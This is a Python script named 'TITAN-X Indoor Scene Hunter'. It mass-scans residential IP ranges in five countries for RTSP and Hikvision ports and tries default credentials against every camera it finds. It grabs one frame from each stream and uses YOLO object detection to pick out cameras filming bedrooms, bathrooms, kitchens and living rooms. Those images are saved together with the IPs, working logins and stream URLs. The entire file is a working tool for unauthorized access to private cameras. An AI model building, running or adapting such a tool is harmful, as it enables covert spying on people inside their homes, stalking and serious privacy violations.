#!/usr/bin/env python3
"""
TITAN-X 5-Country Indoor Scene Hunter
Targets: US, UK, MX, CO, RU
Goal: Find 50+ live cameras showing indoor scenes (bedroom, dining room, kitchen, living room, office, wardrobe/closet)
Pipeline: masscan → fast RTSP probe → YOLO classify → filter indoor → save
Optimized: 8 top creds only, 4s timeout, 60 workers
"""
import subprocess, os, json, sys, time, shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Top 8 most common default creds (covers ~90% of exposed Hikvisions)
CREDS = [
    ('admin', '12345'), ('admin', ''), ('admin', 'admin'), ('admin', '1234'),
    ('admin', '123456'), ('admin', '1111'), ('root', ''), ('root', 'pass'),
]

# Top RTSP paths (Hikvision first since most common)
RTSP_PATHS = [
    '/Streaming/Channels/101',    # Hikvision main
    '/Streaming/Channels/1',      # Hikvision alt
    '/h264/ch1/main/av_stream',   # Dahua
    '/cam/realmonitor?channel=1&subtype=0',  # Dahua alt
    '/stream1',                    # Generic
]

# 5 target countries with high-density CIDR ranges for cameras
COUNTRY_CIDRS = {
    'US': [
        '24.0.0.0/12', '47.128.0.0/10', '68.0.0.0/10', '71.0.0.0/12',
        '72.0.0.0/10', '75.0.0.0/11', '76.0.0.0/12', '96.0.0.0/11',
        '98.0.0.0/11', '107.0.0.0/13', '108.0.0.0/13', '173.0.0.0/10',
        '174.0.0.0/11', '184.0.0.0/11', '209.0.0.0/11',
    ],
    'UK': [
        '2.24.0.0/13', '5.64.0.0/14', '31.48.0.0/14', '51.0.0.0/10',
        '62.0.0.0/11', '78.144.0.0/12', '81.96.0.0/12', '86.128.0.0/11',
        '90.192.0.0/11', '92.0.0.0/13', '109.144.0.0/12', '176.248.0.0/13',
        '213.0.0.0/11',
    ],
    'MX': [
        '187.128.0.0/11', '189.128.0.0/11', '200.52.0.0/14', '201.128.0.0/13',
        '148.243.0.0/16', '177.224.0.0/12', '131.72.0.0/14',
    ],
    'CO': [
        '181.48.0.0/13', '186.80.0.0/13', '190.24.0.0/13', '191.88.0.0/14',
        '200.1.0.0/16', '200.21.0.0/16', '200.69.0.0/16', '201.184.0.0/14',
        '152.200.0.0/14',
    ],
    'RU': [
        '5.0.0.0/13', '31.128.0.0/11', '37.0.0.0/11', '46.0.0.0/11',
        '77.32.0.0/12', '78.0.0.0/11', '85.0.0.0/11', '91.192.0.0/11',
        '95.0.0.0/12', '176.192.0.0/12', '178.0.0.0/11', '185.0.0.0/11',
        '188.128.0.0/11', '212.0.0.0/11',
    ],
}

INDOOR_SCENES = {'bedroom', 'dining_room', 'kitchen', 'living_room', 'office', 'bathroom', 'indoor', 'wardrobe'}

# YOLO class → scene mapping
SCENE_MAP = {
    'bed': 'bedroom', 'teddy bear': 'bedroom', 'hair drier': 'bedroom',
    'dining table': 'dining_room', 'bowl': 'dining_room', 'cup': 'dining_room',
    'wine glass': 'dining_room', 'fork': 'dining_room', 'knife': 'dining_room',
    'spoon': 'dining_room', 'bottle': 'dining_room',
    'refrigerator': 'kitchen', 'oven': 'kitchen', 'microwave': 'kitchen',
    'sink': 'kitchen', 'toaster': 'kitchen',
    'sofa': 'living_room', 'couch': 'living_room', 'tv': 'living_room',
    'remote': 'living_room', 'vase': 'living_room',
    'laptop': 'office', 'keyboard': 'office', 'mouse': 'office',
    'book': 'office', 'clock': 'office', 'tie': 'office', 'scissors': 'office',
    'chair': 'indoor', 'potted plant': 'indoor', 'handbag': 'indoor',
    'suitcase': 'indoor',
    'toilet': 'bathroom', 'toothbrush': 'bathroom',
    'car': 'outside', 'truck': 'outside', 'bus': 'outside', 'bicycle': 'outside',
    'motorcycle': 'outside', 'traffic light': 'outside', 'stop sign': 'outside',
    'fire hydrant': 'outside', 'parking meter': 'outside', 'bench': 'outside',
    'dog': 'outside', 'bird': 'outside', 'skateboard': 'outside',
}

WORK_DIR = '/root/vmos-titan-unified/vmos_titan/playground/cctv-tool'
FRAME_DIR = os.path.join(WORK_DIR, 'hunt_frames')
SCENE_DIR = os.path.join(WORK_DIR, 'hunt_scenes')
os.makedirs(FRAME_DIR, exist_ok=True)
os.makedirs(SCENE_DIR, exist_ok=True)


def masscan_country(country, rate=100000):
    """Masscan a country's ranges for RTSP (554) and Hikvision (8000) ports"""
    ranges = COUNTRY_CIDRS[country]
    cidr_file = f'/tmp/hunt_cidr_{country}.txt'
    result_file = f'/tmp/hunt_masscan_{country}.txt'
    
    with open(cidr_file, 'w') as f:
        f.write('\n'.join(ranges))
    
    cmd = ['masscan', '-iL', cidr_file, '-p', '554,8000',
           '--rate', str(rate), '--open-only', '-oG', result_file,
           '--exclude', '255.255.255.255']
    print(f'  [{country}] Scanning {len(ranges)} CIDR ranges @ {rate} pps...', flush=True)
    
    try:
        subprocess.run(cmd, capture_output=True, timeout=180, text=True)
    except subprocess.TimeoutExpired:
        print(f'  [{country}] masscan timeout (3 min cap)', flush=True)
    
    ips_by_port = {}
    if os.path.exists(result_file):
        with open(result_file) as f:
            for line in f:
                if line.startswith('#') or not line.strip():
                    continue
                ip = port_num = None
                parts = line.split()
                for i, p in enumerate(parts):
                    if p == 'Host:' and i + 1 < len(parts):
                        ip = parts[i + 1]
                    if 'Ports:' in p and i + 1 < len(parts):
                        port_num = parts[i + 1].split('/')[0]
                if ip and port_num:
                    ips_by_port.setdefault(ip, set()).add(port_num)
    
    dual = [ip for ip, p in ips_by_port.items() if '554' in p and '8000' in p]
    rtsp_only = [ip for ip, p in ips_by_port.items() if '554' in p and ip not in dual]
    hik_only = [ip for ip, p in ips_by_port.items() if '8000' in p and ip not in dual]
    
    print(f'  [{country}] {len(ips_by_port)} hosts | {len(dual)} dual | {len(rtsp_only)} RTSP-only | {len(hik_only)} Hik-only', flush=True)
    
    # Priority: dual first, then RTSP, then Hik
    return dual + rtsp_only + hik_only


def probe_rtsp(ip):
    """Fast RTSP probe with 4s timeout — returns stream info or None"""
    for user, passwd in CREDS:
        for rpath in RTSP_PATHS:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            rtsp_url = f'rtsp://{auth}{ip}:554{rpath}'
            frame = os.path.join(FRAME_DIR, f'frame_{ip.replace(".", "_")}.jpg')
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=4, text=True
                )
                if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                    return {
                        'ip': ip, 'user': user, 'password': passwd,
                        'rtsp_url': rtsp_url, 'rtsp_path': rpath,
                        'frame_file': frame, 'frame_size': os.path.getsize(frame),
                    }
            except (subprocess.TimeoutExpired, Exception):
                pass
            # Clean failed
            try:
                if os.path.exists(frame) and os.path.getsize(frame) <= 1000:
                    os.remove(frame)
            except:
                pass
    return None


def classify_frame(model, frame_path):
    """YOLO scene classification"""
    if not model or not os.path.exists(frame_path):
        return None
    try:
        results = model(frame_path, conf=0.15, verbose=False)
        detections = []
        scene_votes = {}
        for r in results:
            for box in r.boxes:
                cls = r.names[int(box.cls)]
                conf = float(box.conf)
                detections.append({'object': cls, 'confidence': round(conf, 3)})
                scene = SCENE_MAP.get(cls)
                if scene:
                    scene_votes[scene] = scene_votes.get(scene, 0) + conf
        if not scene_votes:
            return {'scene': 'unclassified', 'confidence': 0, 'objects': detections}
        best = max(scene_votes, key=scene_votes.get)
        return {'scene': best, 'confidence': round(scene_votes[best], 3), 
                'objects': detections, 'votes': {k: round(v, 3) for k, v in scene_votes.items()}}
    except Exception as e:
        return None


def main():
    countries = ['US', 'UK', 'MX', 'CO', 'RU']
    max_per_country = 5000  # **INCREASED FOR WIDER AGGRESSIVE SCAN**
    
    print(f'{"="*80}', flush=True)
    print(f'TITAN-X INDOOR SCENE HUNTER — 5 Country Campaign', flush=True)
    print(f'Countries: {", ".join(countries)}', flush=True)
    print(f'Target Scenes: bedroom, dining_room, kitchen, living_room, office, wardrobe, bathroom', flush=True)
    print(f'Goal: 50 live verified indoor cameras', flush=True)
    print(f'Config: {len(CREDS)} creds × {len(RTSP_PATHS)} paths | 60 workers | 4s timeout', flush=True)
    print(f'Started: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', flush=True)
    print(f'{"="*80}\n', flush=True)
    
    # Load YOLO
    try:
        from ultralytics import YOLO
        model_path = os.path.join(WORK_DIR, 'yolo11n.pt')
        if not os.path.exists(model_path):
            model_path = os.path.join(os.getcwd(), 'yolov8n.pt')
        if not os.path.exists(model_path):
            model_path = 'yolov8n.pt'
        yolo = YOLO(model_path)
        print(f'[+] YOLO loaded: {model_path}\n', flush=True)
    except Exception as e:
        print(f'[FATAL] YOLO failed: {e}', flush=True)
        return
    
    all_streams = []
    indoor_matches = []
    country_stats = {}
    
    for country in countries:
        print(f'\n{"="*60}', flush=True)
        print(f'[PHASE 1] MASSCAN — {country}', flush=True)
        print(f'{"="*60}', flush=True)
        
        targets = masscan_country(country, rate=100000)
        if not targets:
            print(f'  [{country}] No targets. Next.', flush=True)
            country_stats[country] = {'hosts': 0, 'streams': 0, 'indoor': 0}
            continue
        
        targets = targets[:max_per_country]
        
        print(f'\n[PHASE 2] RTSP PROBE — {country} | {len(targets)} targets | 60 workers', flush=True)
        streams = []
        done = 0
        t0 = time.time()
        
        with ThreadPoolExecutor(max_workers=60) as pool:
            futures = {pool.submit(probe_rtsp, ip): ip for ip in targets}
            for fut in as_completed(futures):
                done += 1
                try:
                    r = fut.result()
                    if r:
                        r['country'] = country
                        streams.append(r)
                        print(f'  [{done}/{len(targets)}] STREAM: {r["ip"]} | {r["user"]}:{r["password"]} | {r["frame_size"]:,}B', flush=True)
                except Exception:
                    pass
                if done % 50 == 0:
                    el = time.time() - t0
                    print(f'  [{done}/{len(targets)}] {el:.0f}s | {len(streams)} streams', flush=True)
        
        el = time.time() - t0
        print(f'  [{country}] Done: {len(streams)} streams in {el:.0f}s', flush=True)
        
        if not streams:
            country_stats[country] = {'hosts': len(targets), 'streams': 0, 'indoor': 0}
            continue
        
        # PHASE 3: YOLO classification
        print(f'\n[PHASE 3] YOLO CLASSIFY — {country} | {len(streams)} frames', flush=True)
        indoor_count = 0
        for s in streams:
            cls = classify_frame(yolo, s['frame_file'])
            if cls:
                s['scene'] = cls
                scene = cls['scene']
                objs = [d['object'] for d in cls.get('objects', [])]
                is_indoor = scene in INDOOR_SCENES
                marker = ' *** INDOOR MATCH ***' if is_indoor else ''
                print(f'  {s["ip"]:>16} [{country}] | {scene:>14} ({cls["confidence"]:.2f}) | {objs}{marker}', flush=True)
                if is_indoor:
                    indoor_count += 1
                    indoor_matches.append(s)
                    # Save to scenes folder
                    dst = os.path.join(SCENE_DIR, f'{country}_{scene}_{s["ip"].replace(".", "_")}.jpg')
                    try: shutil.copy2(s['frame_file'], dst)
                    except: pass
                    s['scene_file'] = dst
            else:
                s['scene'] = {'scene': 'unclassified', 'confidence': 0, 'objects': []}
                print(f'  {s["ip"]:>16} [{country}] | {"unclassified":>14} (dark/blank)', flush=True)
            
            all_streams.append(s)
        
        country_stats[country] = {'hosts': len(targets), 'streams': len(streams), 'indoor': indoor_count}
        
        # Early exit check
        if len(indoor_matches) >= 50:
            print(f'\n[+] GOAL REACHED: {len(indoor_matches)} indoor scenes found! Stopping early.', flush=True)
            break
    
    # === FINAL REPORT ===
    print(f'\n{"="*80}', flush=True)
    print(f'FINAL REPORT — {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', flush=True)
    print(f'{"="*80}', flush=True)
    
    print(f'\nCountry Stats:', flush=True)
    for c, s in country_stats.items():
        print(f'  {c}: {s["hosts"]} probed → {s["streams"]} streams → {s["indoor"]} indoor', flush=True)
    
    print(f'\nTotal: {len(all_streams)} streams | {len(indoor_matches)} indoor scene matches', flush=True)
    
    # Scene breakdown
    scene_counts = {}
    for s in all_streams:
        sc = s.get('scene', {}).get('scene', 'unclassified')
        scene_counts[sc] = scene_counts.get(sc, 0) + 1
    
    print(f'\nScene Breakdown:', flush=True)
    for sc, cnt in sorted(scene_counts.items(), key=lambda x: -x[1]):
        marker = ' *** TARGET' if sc in INDOOR_SCENES else ''
        print(f'  {sc:>18}: {cnt}{marker}', flush=True)
    
    if indoor_matches:
        print(f'\n=== INDOOR SCENE MATCHES ({len(indoor_matches)}) ===', flush=True)
        for i, s in enumerate(indoor_matches, 1):
            sc = s.get('scene', {})
            objs = ', '.join(f'{d["object"]}({d["confidence"]:.0%})' for d in sc.get('objects', []))
            print(f'  {i:>3}. [{s["country"]}] {s["ip"]:>16} | {sc["scene"]:>14} ({sc["confidence"]:.2f}) | creds: {s["user"]}:{s["password"]}', flush=True)
            print(f'       RTSP: {s["rtsp_url"]}', flush=True)
            print(f'       Objects: {objs}', flush=True)
    
    # Save results
    out_all = os.path.join(WORK_DIR, f'hunt_all_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
    out_indoor = os.path.join(WORK_DIR, f'hunt_indoor_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
    
    with open(out_all, 'w') as f:
        json.dump({
            'timestamp': datetime.now().isoformat(),
            'countries': countries, 'country_stats': country_stats,
            'total_streams': len(all_streams), 'indoor_matches': len(indoor_matches),
            'scene_breakdown': scene_counts,
            'streams': all_streams,
        }, f, indent=2, default=str)
    
    if indoor_matches:
        with open(out_indoor, 'w') as f:
            json.dump(indoor_matches, f, indent=2, default=str)
    
    print(f'\nSaved: {out_all}', flush=True)
    if indoor_matches:
        print(f'Indoor matches: {out_indoor}', flush=True)
    print(f'\nFrames: {FRAME_DIR}/', flush=True)
    print(f'Scene captures: {SCENE_DIR}/', flush=True)


if __name__ == '__main__':
    main()
